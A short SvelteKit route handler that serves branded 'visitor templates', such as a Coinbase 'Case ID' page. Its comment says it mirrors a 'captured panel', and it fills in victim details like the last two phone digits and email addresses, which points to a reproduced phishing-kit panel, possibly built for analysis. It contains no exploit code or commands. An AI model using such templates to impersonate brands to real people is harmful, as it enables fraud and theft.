/**
 * Visitor template URL alias.
 *
 * Mirrors the URL format the captured panel uses for its admin "Redirect"
 * iframe preview: /templates/preview/{Brand}/{PageName} (e.g.
 * /templates/preview/Coinbase/Case%20ID). Same handler as the local-style
 * /preview/{Brand}/{Page} route.
 */
import { error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { loadTemplateHtml } from '$lib/server/visitorTemplates';

export const GET: RequestHandler = async ({ params, url }) => {
	const brand = decodeURIComponent(params.brand);
	const page = decodeURIComponent(params.page);

	const overrides = {
		lastTwoDigits: url.searchParams.get('last2') || undefined,
		emailFrom: url.searchParams.get('emailFrom') || undefined,
		emailTo: url.searchParams.get('emailTo') || undefined
	};

	const html = loadTemplateHtml(brand, page, overrides);
	if (!html) {
		throw error(404, `Unknown visitor template: ${brand}/${page}`);
	}

	return new Response(html, {
		headers: {
			'Content-Type': 'text/html; charset=utf-8',
			'Cache-Control': 'no-store'
		}
	});
};
